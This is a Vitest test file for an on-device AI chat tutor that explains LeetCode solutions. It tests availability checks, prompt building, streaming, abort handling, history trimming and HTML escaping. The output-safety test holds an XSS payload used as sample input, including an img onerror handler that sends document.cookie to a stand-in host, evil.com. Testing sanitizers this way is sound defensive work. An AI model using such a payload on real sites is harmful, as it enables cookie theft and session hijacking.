import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import '../shared/nano-ai.js';
import '../shared/nano-chat-service.js';

describe('NanoChatService Unit & Prompt API Tests (Step 2)', () => {
  const service = globalThis.NanoChatService;
  const nanoAi = globalThis.NanoAIModule;

  const sampleProblem = {
    frontend_id: '1',
    number: 1,
    title: 'Two Sum',
    slug: 'two-sum',
    difficulty: 'Easy',
    pattern_title: 'Hash Table / Complement Invariant'
  };

  const samplePattern = {
    id: 'two-pointers',
    title: 'Hash Table / Complement Invariant'
  };

  const sampleCode = `def twoSum(nums: list[int], target: int) -> list[int]:
    seen = {}
    for i, num in enumerate(nums):
        comp = target - num
        if comp in seen:
            return [seen[comp], i]
        seen[num] = i
    return []`;

  beforeEach(async () => {
    await service.clearStoredChat('two-sum');
    service.destroySession();
  });

  afterEach(() => {
    delete globalThis.LanguageModel;
    service.destroySession();
  });

  // 1. Availability States
  describe('1. LanguageModel Availability States', () => {
    it('reports "available" when model is ready on-device', async () => {
      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available')
      };
      const status = await service.checkAvailability();
      expect(status).toBe('available');
    });

    it('reports "downloadable" when user activation / download is required', async () => {
      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('downloadable')
      };
      const status = await service.checkAvailability();
      expect(status).toBe('downloadable');
    });

    it('reports "downloading" when model download is currently running', async () => {
      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('downloading')
      };
      const status = await service.checkAvailability();
      expect(status).toBe('downloading');
    });

    it('reports "unavailable" when model is unsupported or disabled', async () => {
      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('unavailable')
      };
      const status = await service.checkAvailability();
      expect(status).toBe('unavailable');
    });

    it('reports "unavailable" when LanguageModel global is undefined or throws', async () => {
      delete globalThis.LanguageModel;
      const status = await service.checkAvailability();
      expect(status).toBe('unavailable');

      globalThis.LanguageModel = {
        availability: vi.fn().mockRejectedValue(new Error('Internal failure'))
      };
      const thrownStatus = await service.checkAvailability();
      expect(thrownStatus).toBe('unavailable');
    });

    it('passes expectedOutputs and expectedOutputLanguages: ["en"] to availability for safety attestation', async () => {
      const availSpy = vi.fn().mockResolvedValue('available');
      globalThis.LanguageModel = {
        availability: availSpy
      };
      await service.checkAvailability();
      expect(availSpy).toHaveBeenCalled();
      expect(availSpy.mock.calls[0][0]).toMatchObject({
        expectedOutputLanguages: ['en'],
        expectedOutputs: [{ type: 'text', languages: ['en'] }]
      });
    });
  });

  // 2. System Prompt Composition
  describe('2. System Prompt Composition', () => {
    it('injects required DSA tutor prompt with real problem metadata and blueprint code', () => {
      const prompt = service.buildSystemPrompt({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3'
      });

      // Required exact tutor wording
      expect(prompt).toContain(
        "You are a concise DSA tutor inside a LeetCode helper. Explain the user's code for problem 1 Two Sum (Hash Table / Complement Invariant, python3). Use short paragraphs and small code snippets. Don't invent facts about the code. If something isn't in the provided code, say so."
      );
      // Real metadata fields
      expect(prompt).toContain('- Number: 1');
      expect(prompt).toContain('- Title: Two Sum');
      expect(prompt).toContain('- Difficulty: Easy');
      expect(prompt).toContain('- Pattern: Hash Table / Complement Invariant');
      expect(prompt).toContain('- Language: python3');
      // Real blueprint code
      expect(prompt).toContain('```python3');
      expect(prompt).toContain('seen = {}');
    });
  });

  // 2b. Context-Aware Prompt Formatting & Grounding
  describe('2b. Context-Aware Prompt Grounding', () => {
    it('injects problem number, title, difficulty, pattern, language and blueprint code on first turn', () => {
      const formatted = service.formatPromptWithContext({
        message: 'tell me about this problem',
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        includeBlueprint: true
      });

      expect(formatted).toContain('[Problem Context: #1 Two Sum | Easy | Pattern: Hash Table / Complement Invariant | Language: python3]');
      expect(formatted).toContain('[Verified Solution Blueprint (python3):');
      expect(formatted).toContain('seen = {}');
      expect(formatted).toContain('User Question: tell me about this problem');
    });

    it('injects concise problem header on follow-up turns without duplicating blueprint code', () => {
      const formatted = service.formatPromptWithContext({
        message: 'what is the space complexity?',
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        includeBlueprint: false
      });

      expect(formatted).toContain('[Problem Context: #1 Two Sum | Easy | Pattern: Hash Table / Complement Invariant | Language: python3]');
      expect(formatted).not.toContain('[Verified Solution Blueprint');
      expect(formatted).toContain('User Question: what is the space complexity?');
    });

    it('sends contextualized prompt to Prompt API while storing only clean user text in history', async () => {
      let promptReceivedByModel = '';
      const createSpy = vi.fn().mockResolvedValue({
        promptStreaming: vi.fn().mockImplementation((prompt) => {
          promptReceivedByModel = prompt;
          return (async function* () {
            yield 'Two Sum is a classic hash map problem.';
          })();
        }),
        destroy: vi.fn()
      });

      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: createSpy
      };

      const res = await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'tell me about this problem'
      });

      expect(res.success).toBe(true);
      expect(createSpy).toHaveBeenCalled();
      expect(createSpy.mock.calls[0][0]).toMatchObject({
        expectedOutputLanguages: ['en'],
        expectedOutputs: [{ type: 'text', languages: ['en'] }]
      });
      // Prompt sent to model must contain problem grounding
      expect(promptReceivedByModel).toContain('#1 Two Sum');
      expect(promptReceivedByModel).toContain('Hash Table / Complement Invariant');
      expect(promptReceivedByModel).toContain('seen = {}');
      expect(promptReceivedByModel).toContain('User Question: tell me about this problem');

      // Stored user message in storage must remain clean without prompt wrappers
      const history = await service.getStoredChat('two-sum');
      expect(history.length).toBe(2);
      expect(history[0].role).toBe('user');
      expect(history[0].text).toBe('tell me about this problem');
      expect(history[1].role).toBe('assistant');
      expect(history[1].text).toBe('Two Sum is a classic hash map problem.');
    });
  });

  // 3. Streaming (Delta vs Cumulative)
  describe('3. Stream Chunk Normalization (Delta vs Cumulative)', () => {
    it('normalizes delta chunks correctly', async () => {
      const deltaChunks = ['The ', 'hash table ', 'stores complements.'];
      async function* mockDeltaStream() {
        for (const chunk of deltaChunks) {
          yield chunk;
        }
      }

      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: vi.fn().mockResolvedValue({
          promptStreaming: vi.fn().mockReturnValue(mockDeltaStream()),
          destroy: vi.fn()
        })
      };

      const emitted = [];
      const res = await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'Explain intuition',
        onChunk: (accumulated) => {
          emitted.push(accumulated);
        }
      });

      expect(res.success).toBe(true);
      expect(res.text).toBe('The hash table stores complements.');
      expect(emitted).toEqual([
        'The ',
        'The hash table ',
        'The hash table stores complements.'
      ]);
    });

    it('normalizes cumulative chunks correctly without duplicated words', async () => {
      const cumulativeChunks = [
        'The',
        'The hash',
        'The hash table',
        'The hash table stores complements.'
      ];
      async function* mockCumulativeStream() {
        for (const chunk of cumulativeChunks) {
          yield chunk;
        }
      }

      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: vi.fn().mockResolvedValue({
          promptStreaming: vi.fn().mockReturnValue(mockCumulativeStream()),
          destroy: vi.fn()
        })
      };

      const emitted = [];
      const res = await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'Explain intuition',
        onChunk: (accumulated) => {
          emitted.push(accumulated);
        }
      });

      expect(res.success).toBe(true);
      expect(res.text).toBe('The hash table stores complements.');
      expect(emitted).toEqual(cumulativeChunks);
    });
  });

  // 4. Abort Handling
  describe('4. Abort Controller Cancellation', () => {
    it('halts stream upon abort and preserves partial generated text in storage', async () => {
      const abortController = new AbortController();

      async function* mockInfiniteStream() {
        yield 'Partial chunk one. ';
        yield 'Partial chunk two. ';
        // Trigger abort before third chunk
        abortController.abort();
        yield 'Should not appear.';
      }

      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: vi.fn().mockResolvedValue({
          promptStreaming: vi.fn().mockReturnValue(mockInfiniteStream()),
          destroy: vi.fn()
        })
      };

      const res = await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'Walk through code',
        signal: abortController.signal
      });

      expect(res.success).toBe(false);
      expect(res.aborted).toBe(true);
      expect(res.text).toContain('Partial chunk one. Partial chunk two.');
      expect(res.text).not.toContain('Should not appear.');

      // Storage should have both user message and partial assistant message
      const history = await service.getStoredChat('two-sum');
      expect(history.length).toBe(2);
      expect(history[0].role).toBe('user');
      expect(history[1].role).toBe('assistant');
      expect(history[1].text).toContain('Partial chunk one.');
    });
  });

  // 5. Quota Trimming
  describe('5. Quota-Aware History Trimming', () => {
    it('preserves system prompt and trims oldest turns first to fit within quota', () => {
      const systemPrompt = service.buildSystemPrompt({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3'
      });

      const messages = [
        { id: '1', role: 'user', text: 'Turn 1 User query that is very long '.repeat(10) },
        { id: '2', role: 'assistant', text: 'Turn 1 Assistant response that is also very long '.repeat(10) },
        { id: '3', role: 'user', text: 'Turn 2 User query '.repeat(10) },
        { id: '4', role: 'assistant', text: 'Turn 2 Assistant response '.repeat(10) },
        { id: '5', role: 'user', text: 'Latest Turn 3 User query' },
        { id: '6', role: 'assistant', text: 'Latest Turn 3 Assistant response' }
      ];

      // Constrain quota tightly so trimming must occur
      const trimmed = service.trimHistoryForQuota({
        systemPrompt,
        messages,
        quota: 700,
        reservedTokens: 400
      });

      // System prompt is not in the history array, but the history array should be trimmed from the front
      expect(trimmed.length).toBeLessThan(messages.length);
      // Newest message must be preserved
      expect(trimmed[trimmed.length - 1].id).toBe('6');
      // Oldest message (id '1') must have been trimmed
      expect(trimmed.some((m) => m.id === '1')).toBe(false);
    });
  });

  // 6. Regenerate
  describe('6. Regenerate Assistant Reply', () => {
    it('removes last assistant turn and re-prompts last user query in rebuilt session', async () => {
      const createMock = vi.fn();
      let callCount = 0;

      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: createMock.mockImplementation(() => {
          callCount++;
          const currentCount = callCount;
          return Promise.resolve({
            promptStreaming: vi.fn().mockImplementation(async function* () {
              yield `Response generation #${currentCount}`;
            }),
            destroy: vi.fn()
          });
        })
      };

      // Turn 1
      await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'First question'
      });

      let history = await service.getStoredChat('two-sum');
      expect(history.length).toBe(2);
      expect(history[1].text).toBe('Response generation #1');

      // Regenerate
      const regenRes = await service.regenerateLastMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3'
      });

      expect(regenRes.success).toBe(true);
      expect(regenRes.text).toBe('Response generation #2');

      // History should still only have 2 messages (1 user, 1 regenerated assistant)
      history = await service.getStoredChat('two-sum');
      expect(history.length).toBe(2);
      expect(history[0].role).toBe('user');
      expect(history[0].text).toBe('First question');
      expect(history[1].role).toBe('assistant');
      expect(history[1].text).toBe('Response generation #2');
    });
  });

  // 7. Storage Persistence and Cap
  describe('7. Storage Persistence & Capping', () => {
    it('caps stored messages to MAX_MESSAGES_PER_PROBLEM (20) and restores on open', async () => {
      const slug = 'two-sum';
      const messages = [];
      for (let i = 1; i <= 25; i++) {
        messages.push({
          id: `msg-${i}`,
          role: i % 2 === 1 ? 'user' : 'assistant',
          text: `Message ${i}`,
          timestamp: Date.now() + i
        });
      }

      await service.saveStoredChat(slug, messages);
      const restored = await service.getStoredChat(slug);
      expect(restored.length).toBe(20);
      expect(restored[0].text).toBe('Message 6');
      expect(restored[19].text).toBe('Message 25');
    });

    it('clearStoredChat empties storage and destroys active session', async () => {
      const destroyMock = vi.fn();
      globalThis.LanguageModel = {
        availability: vi.fn().mockResolvedValue('available'),
        create: vi.fn().mockResolvedValue({
          destroy: destroyMock,
          promptStreaming: vi.fn().mockImplementation(async function* () {
            yield 'Hi';
          })
        })
      };

      await service.sendMessage({
        problem: sampleProblem,
        pattern: samplePattern,
        code: sampleCode,
        lang: 'python3',
        message: 'Hello'
      });

      expect(await service.getStoredChat('two-sum')).toHaveLength(2);

      await service.clearStoredChat('two-sum');

      expect(await service.getStoredChat('two-sum')).toHaveLength(0);
      expect(destroyMock).toHaveBeenCalled();
    });
  });

  // 8. Output Safety & HTML Escaping
  describe('8. Output Safety & HTML Escaping', () => {
    it('sanitizes and escapes script tags and malicious attributes in markdown output', () => {
      const maliciousOutput = `
Here is how it works:
<script>alert("pwned")</script>
<img src=x onerror="fetch('http://evil.com?c='+document.cookie)" />
<a href="javascript:alert(1)">Click me</a>

\`\`\`javascript
const x = 10;
\`\`\`
      `;

      const html = nanoAi.renderMarkdownToHtml(maliciousOutput);

      // Script and tag characters must be escaped so no executable elements exist
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');

      // Verify DOM safety: parsing into DOM produces no executable tags
      if (typeof document !== 'undefined') {
        const div = document.createElement('div');
        div.innerHTML = html;
        expect(div.querySelector('script')).toBeNull();
        expect(div.querySelector('img')).toBeNull();
      }

      // Code block should be formatted safely
      expect(html).toContain('<pre');
      expect(html).toContain('const x = 10;');
    });
  });
});
